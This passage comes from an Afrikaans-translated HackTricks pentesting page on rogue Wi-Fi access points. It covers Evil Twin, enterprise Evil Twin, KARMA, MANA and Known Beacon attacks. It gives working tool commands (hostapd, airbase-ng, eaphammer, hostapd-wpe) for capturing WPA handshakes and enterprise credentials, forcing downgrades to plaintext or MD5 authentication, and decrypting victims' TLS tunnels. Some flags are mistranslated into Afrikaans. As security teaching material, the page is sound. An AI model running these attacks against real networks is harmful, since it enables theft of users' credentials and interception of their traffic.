* Stasies stoor die ESSID van elke draadlose netwerk waarmee hulle verbind in hul Voorkeur Netwerklyste (PNL's), saam met netwerkspesifieke konfigurasiebesonderhede.
* Die PNL word gebruik om outomaties aan bekende netwerke te koppel, wat die gebruiker se ervaring verbeter deur die koppelingsproses te stroomlyn.

### Passiewe Skandering

* AP's straal periodiek bakenskemas uit, wat hul teenwoordigheid en kenmerke aankondig, insluitend die AP se ESSID tensy uitsaai uitgeskakel is.
* Tydens passiewe skandering luister stasies vir bakenskemas. As 'n baken se ESSID ooreenstem met 'n inskrywing in die stasie se PNL, kan die stasie outomaties daaraan koppel.
* Kennis van 'n toestel se PNL maak potensi√´le uitbuiting moontlik deur 'n bekende netwerk se ESSID na te boots, wat die toestel mislei om aan 'n bedrieglike AP te koppel.

### Aktiewe Ondersoek

* Aktiewe ondersoek behels stasies wat navraagversoeke stuur om nabygele√´ AP's en hul eienskappe te ontdek.
* Gerigte navraagversoeke teiken 'n spesifieke ESSID, wat help om vas te stel of 'n bepaalde netwerk binne bereik is, selfs al is dit 'n verborge netwerk.
* Uitsaai navraagversoeke het 'n nul SSID-veld en word na al die nabygele√´ AP's gestuur, sodat die stasie kan kyk vir enige voorkeur netwerk sonder om sy PNL-inhoud bekend te maak.

## Eenvoudige AP met omleiding na die Internet

Voordat daar verduidelik word hoe om meer komplekse aanvalle uit te voer, sal daar verduidelik word **hoe** om net **'n AP** te **skep** en dit se **verkeer** na 'n koppelvlak wat aan die **Internet** verbind is, **om te lei**.

Deur `ifconfig -a` te gebruik, kontroleer dat die wlan-koppelvlak om die AP te skep en die koppelvlak wat aan die Internet verbind is, teenwoordig is.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Skep die konfigurasie l√™er `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dan **stel IP-adresse** en **roetes** in:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
En begin dan **dnsmasq**:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Skep 'n konfigurasie l√™er `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Stop irriterende prosesse**, stel **monitor-modus** in, en **begin hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Deurverwysing en Herleiing
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Boosaardige Tweeling

'n Boosaardige tweelingaanval maak gebruik van die manier waarop WiFi-kli√´nte netwerke herken, wat hoofsaaklik staatmaak op die netwerknaam (ESSID) sonder om die basisstasie (toegangspunt) te vereis om homself aan die kli√´nt te authentiseer. Sleutelpunte sluit in:

- **Moeilikheid in Differensiasie**: Toestelle sukkel om tussen legitieme en bedrieglike toegangspunte te onderskei wanneer hulle dieselfde ESSID en enkripsietipe deel. Werklike netwerke gebruik dikwels verskeie toegangspunte met dieselfde ESSID om dekking vlot uit te brei.
- **Kli√´nt Roaming en Verbindingsmanipulasie**: Die 802.11-protokol laat toestelle toe om tussen toegangspunte binne dieselfde ESS te beweeg. Aanvallers kan hiervan gebruik maak deur 'n toestel te lok om van sy huidige basisstasie te ontkoppel en met 'n bedrieglike een te verbind. Dit kan bereik word deur 'n sterker sein aan te bied of die verbinding met die legitieme toegangspunt te ontwrig deur metodes soos deautentiseringspakette of stoor.
- **Uitdagings in Uitvoering**: Dit is moeilik om 'n boosaardige tweelingaanval suksesvol uit te voer in omgewings met verskeie, goedgeplaaste toegangspunte. Die deautentisering van 'n enkele legitieme toegangspunt lei dikwels daartoe dat die toestel met 'n ander legitieme toegangspunt verbind tensy die aanvaller al die nabygele√´ toegangspunte kan deautentiseer of die bedrieglike toegangspunt strategies kan plaas.

Jy kan 'n baie basiese Oop Boosaardige Tweeling (geen vermo√´ om verkeer na die internet te roeteer) skep deur:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Jy kan ook 'n Boosaardige Tweeling skep met behulp van **eaphammer** (let daarop dat om boosaardige tweelinge met eaphammer te skep, moet die koppelvlak **NIET in** **monitor**-modus wees):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Of deur Airgeddon te gebruik: `Opsies: 5,6,7,8,9 (binne die Evil Twin-aanvalsmenu).`

![](<../../.gitbook/assets/image (1088).png>)

Let asseblief daarop dat as 'n ESSID in die PNL standaard as WPA beskerm is, sal die toestel nie outomaties verbind met 'n Oop evil Twin nie. Jy kan probeer om die werklike AP te DoS en hoop dat die gebruiker handmatig met jou Oop evil twin sal verbind, of jy kan die werklike AP DoS en 'n WPA Evil Twin gebruik om die handshake vas te vang (deur hierdie metode sal jy nie in staat wees om die slagoffer met jou te laat verbind nie aangesien jy nie die PSK ken nie, maar jy kan die handshake vasvang en probeer om dit te kraak).

_Sommige OS en AV sal die gebruiker waarsku dat om met 'n Oop netwerk te verbind, gevaarlik is..._

### WPA/WPA2 Evil Twin

Jy kan 'n **Evil Twin skep wat WPA/2 gebruik** en as die toestelle ingestel is om met daardie SSID met WPA/2 te verbind, gaan hulle probeer om te verbind. Hoe dan ook, **om die 4-weg-handshake te voltooi** moet jy ook die **wagwoord** weet wat die klient gaan gebruik. As jy dit **nie weet** nie, sal die **verbindig nie voltooi word** nie.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Onderneming Boosaardige Tweeling

Om hierdie aanvalle te verstaan, sal ek aanbeveel om eers die kort [WPA Onderneming verduideliking](./#wpa-enterprise-mgt) te lees.

**Die gebruik van hostapd-wpe**

`hostapd-wpe` benodig 'n **konfigurasie** l√™er om te werk. Om die generering van hierdie konfigurasies te **outomatiseer**, kan jy [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) gebruik (laai die python l√™er binne _/etc/hostapd-wpe/_ af)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In die opsetl√™er kan jy baie verskillende dinge kies soos ssid, kanaal, gebruikersl√™ers, sleutel, dh parameters, wpa weergawe en outentifisering...

[**Die gebruik van hostapd-wpe met EAP-TLS om enige sertifikaat toe te laat om in te teken.**](evil-twin-eap-tls.md)

**Die gebruik van EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standaard, doel EAPHammer hierdie verifikasie metodes (merk GTC as die eerste een om te probeer om platte teks wagwoorde te verkry en dan die gebruik van meer robuuste verifikasie metodes):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dit is die standaard metodologie om lang verbindings tye te vermy. Jy kan egter ook spesifiseer om die verifikasie metodes vanaf die swakste tot die sterkste aan die bediener te spesifiseer:
```
--negotiate weakest
```
Of jy kan ook gebruik maak van:

* `--onderhandel gtc-afgradering` om 'n hoogs effektiewe GTC-afgraderingsimplementering te gebruik (platte teks wagwoorde)
* `--onderhandel handmatig --fase-1-metodes PEAP,TTLS --fase-2-metodes MSCHAPV2,GTC,TTLS-PAP` om handmatig die aangebode metodes te spesifiseer (deur dieselfde outentiseringsmetodes in dieselfde volgorde aan te bied as die organisasie, sal die aanval baie moeiliker wees om op te spoor).
* [Vind meer inligting in die wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Die gebruik van Airgeddon**

`Airgeddon` kan voorheen gegenereerde sertifikate gebruik om EAP-outentisering aan te bied aan WPA/WPA2-Enterprise-netwerke. Die vals netwerk sal die verbindingsprotokol afgradeer na EAP-MD5 sodat dit in staat sal wees om **die gebruiker en die MD5 van die wagwoord vas te vang**. Later kan die aanvaller probeer om die wagwoord te kraak.\
`Airggedon` bied jou die moontlikheid van 'n **deurlopende Evil Twin-aanval (lawaaierig)** of **net die Evil-aanval skep totdat iemand koppel (glad).**

![](<../../.gitbook/assets/image (936).png>)

### Foutopsporing van PEAP en EAP-TTLS TLS-tunnels in Evil Twins-aanvalle

_Hierdie metode is getoets in 'n PEAP-verbinding, maar aangesien ek 'n willekeurige TLS-tunnel ontsluit, behoort dit ook te werk met EAP-TTLS_

Binne die **konfigurasie** van _hostapd-wpe_ **kommentaar** die lyn wat _**dh\_file**_ bevat (vanaf `dh_file=/etc/hostapd-wpe/certs/dh` tot `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dit sal `hostapd-wpe` laat **sleutels uitruil deur RSA** in plaas van DH, sodat jy later die verkeer kan **ontsleutel** deur die bedieners se privaatsleutel te ken.

Begin nou die **Evil Twin** met behulp van **`hostapd-wpe`** met daardie gewysigde konfigurasie soos gewoonlik. Begin ook **`wireshark`** op die **koppelvlak** wat die Evil Twin-aanval uitvoer.

Nou of later (wanneer jy reeds 'n paar outentiseringspogings vasgel√™ het) kan jy die privaat RSA-sleutel byvoeg by wireshark in: `Edit --> Voorkeure --> Protokolle --> TLS --> (RSA-sleutellys) Wysig...`

Voeg 'n nuwe inskrywing by en vul die vorm in met hierdie waardes: **IP-adres = enige** -- **Poort = 0** -- **Protokol = data** -- **Sleutel-l√™er** (**kies jou sleutel-l√™er**, om probleme te voorkom, kies 'n sleutel-l√™er **sonder wagwoordbeskerming**).

![](<../../.gitbook/assets/image (687).png>)

En kyk na die nuwe **"Ontsleutelde TLS" tabblad**:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, Luide MANA en Bekende beacons-aanval

### ESSID en MAC swart/witlyste

Verskillende tipes Media Access Control Filterlyste (MFACLs) en hul ooreenstemmende modusse en effekte op die gedrag van 'n bedrieglike Toegangspunt (AP):

1. **MAC-gebaseerde Witlys**:
* Die bedrieglike AP sal slegs reageer op navrae van toestelle wat in die witlys gespesifiseer is, en onsigbaar bly vir almal wat nie gelys is nie.
2. **MAC-gebaseerde Swartlys**:
* Die bedrieglike AP sal navrae van toestelle op die swartlys ignoreer, wat die bedrieglike AP effektief onsigbaar maak vir daardie spesifieke toestelle.
3. **ESSID-gebaseerde Witlys**:
* Die bedrieglike AP sal slegs reageer op navrae vir spesifieke ESSIDs wat gelys is, en dit onsigbaar maak vir toestelle waarvan die Voorkeur Netwerklyste (PNLs) nie daardie ESSIDs bevat nie.
4. **ESSID-gebaseerde Swartlys**:
* Die bedrieglike AP sal nie reageer op navrae vir die spesifieke ESSIDs op die swartlys nie, wat dit onsigbaar maak vir toestelle wat daardie spesifieke netwerke soek.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Hierdie metode maak dit vir 'n aanvaller moontlik om 'n bose toegangspunt (AP) te skep wat reageer op alle navraagversoeke van toestelle wat probeer om met netwerke te verbind. Hierdie tegniek mislei toestelle om met 'n aanvaller se AP te verbind deur die netwerke na te boots wat die toestelle soek. Sodra 'n toestel 'n verbindingsversoek na hierdie bedrieglike AP stuur, voltooi dit die verbinding, wat daartoe lei dat die toestel per abuis met die aanvaller se netwerk verbind.

### MANA

Daarna het toestelle begin om ongevraagde netwerkreaksies te ignoreer, wat die doeltreffendheid van die oorspronklike karma-aanval verminder het. Nietemin is 'n nuwe metode, bekend as die MANA-aanval, deur Ian de Villiers en Dominic White bekendgestel. Hierdie metode behels dat die bose AP die Voorkeur Netwerklyste (PNL) van toestelle vasvang deur te reageer op hul uitsaaiversoeke met netwerkname (SSIDs) wat voorheen deur die toestelle versoek is. Hierdie gesofistikeerde aanval verbygaan die beskerming teen die oorspronklike karma-aanval deur die manier waarop toestelle bekende netwerke onthou en prioriteer, te misbruik.

Die MANA-aanval werk deur beide gerigte en uitsaaiversoeke van toestelle te monitor. Vir gerigte versoeke neem dit die toestel se MAC-adres en die versoekte netwerknaam op, en voeg hierdie inligting by 'n lys. Wanneer 'n uitsaaiversoek ontvang word, reageer die AP met inligting wat ooreenstem met enige van die netwerke op die toestel se lys, wat die toestel verlok om met die bose AP te verbind.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Luide MANA

'n **Luide MANA-aanval** is 'n gevorderde strategie vir wanneer toestelle nie gerigte deursoekings gebruik nie of wanneer hul Voorkeur Netwerklyste (PNL) onbekend is vir die aanvaller. Dit werk op die beginsel dat **toestelle in dieselfde area waarskynlik sommige netwerkname in hul PNLs sal deel**. In plaas van selektief te reageer, stuur hierdie aanval sonder onderskeid sondes wat reageer op elke netwerknaam (ESSID) wat gevind word in die gekombineerde PNLs van al waargenome toestelle. Hierdie bre√´ benadering verhoog die kans dat 'n toestel 'n bekende netwerk sal herken en sal probeer om met die bedrieglike Toegangspunt (AP) te verbind.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Bekende Beacon-aanval

Wanneer die **Loud MANA-aanval** nie voldoende is nie, bied die **Bekende Beacon-aanval** 'n ander benadering. Hierdie metode **brute-force die verbindingsproses deur 'n AP te simuleer wat reageer op enige netwerknaam, deur 'n lys potensi√´le ESSIDs afgelei van 'n woordelys te deurloop**. Dit simuleer die teenwoordigheid van verskeie netwerke, in die hoop om 'n ESSID binne die slagoffer se PNL te koppel, wat 'n verbindingspoging na die vervaardigde AP aanmoedig. Die aanval kan versterk word deur dit te kombineer met die `--loud`-opsie vir 'n meer aggressiewe poging om toestelle te vang.

Eaphammer het hierdie aanval ge√Ømplementeer as 'n MANA-aanval waar al die ESSIDs binne 'n lys geloods word (jy kan dit ook kombineer met `--loud` om 'n Loud MANA + Bekende beacons-aanval te skep):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Bekende Beacon Burst-aanval**

Die **Bekende Beacon Burst-aanval** behels die **vinnige uitsaai van seinraamwerke vir elke ESSID wat in 'n l√™er gelys is**. Dit skep 'n digte omgewing van valse netwerke, wat die waarskynlikheid van toestelle wat aan die bedrieglike AP koppel aansienlik verhoog, veral wanneer dit gekombineer word met 'n MANA-aanval. Hierdie tegniek maak gebruik van spoed en volume om toestelle se netwerkseleksiemeganismes te oorweldig.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direk

**Wi-Fi Direk** is 'n protokol wat toestelle in staat stel om direk met mekaar te skakel deur Wi-Fi te gebruik sonder die nodigheid van 'n tradisionele draadlose toegangspunt. Hierdie vermo√´ is ge√Øntegreer in verskeie Internet of Things (IoT) toestelle, soos drukkers en televisies, wat direkte toestel-tot-toestel kommunikasie fasiliteer. 'n Merkwaardige kenmerk van Wi-Fi Direk is dat een toestel die rol van 'n toegangspunt aanneem, bekend as die groep eienaar, om die verbinding te bestuur.

Sekuriteit vir Wi-Fi Direk verbindinge word tot stand gebring deur **Wi-Fi Protected Setup (WPS)**, wat verskeie metodes ondersteun vir veilige koppeling, insluitend:

* **Drukknoppie-opstelling (PBC)**
* **PIN-invoer**
* **Naby-veld kommunikasie (NFC)**

Hierdie metodes, veral PIN-invoer, is vatbaar vir dieselfde kwesbaarhede as WPS in tradisionele Wi-Fi netwerke, wat hulle teikens maak vir soortgelyke aanvalsvektore.

### EvilDirect Ontvoering

**EvilDirect Ontvoering** is 'n aanval spesifiek vir Wi-Fi Direk. Dit boots die konsep van 'n Evil Twin aanval na, maar teiken Wi-Fi Direk verbindinge. In hierdie scenario boots 'n aanvaller 'n legitieme groep eienaar na met die doel om toestelle te mislei om met 'n skadelike entiteit te verbind. Hierdie metode kan uitgevoer word met behulp van gereedskap soos `airbase-ng` deur die kanaal, ESSID, en MAC-adres van die nagebootste toestel te spesifiseer:

## Verwysings

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: Neem 'n kyk na [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (aanmelding met facebook en imitasie van WPA in kaptiewe portale)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hacken-insigte**\
Betrokkenheid by inhoud wat die opwinding en uitdagings van hacken ondersoek

**Re√´le tyd Hack-nuus**\
Bly op hoogte van die snelbewegende hackw√™reld deur re√´le tyd nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en noodsaaklike platformopdaterings

Sluit aan by ons op [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!

<details>

<summary><strong>Leer AWS hack van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien jou **maatskappy geadverteer in HackTricks** of **laai HackTricks af in PDF** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
